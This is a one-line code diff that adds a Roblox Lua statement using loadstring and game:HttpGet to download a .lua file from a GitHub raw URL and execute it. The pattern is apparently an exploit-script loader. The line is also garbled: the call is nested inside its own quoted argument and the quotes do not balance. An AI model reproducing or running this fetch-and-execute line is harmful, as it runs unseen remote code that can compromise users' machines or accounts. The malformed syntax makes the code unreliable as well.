@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('loadstring(game:HttpGet('https://raw.githubusercontent.com/woolips/tolis/main/77_7DBZZJU.lua'))()
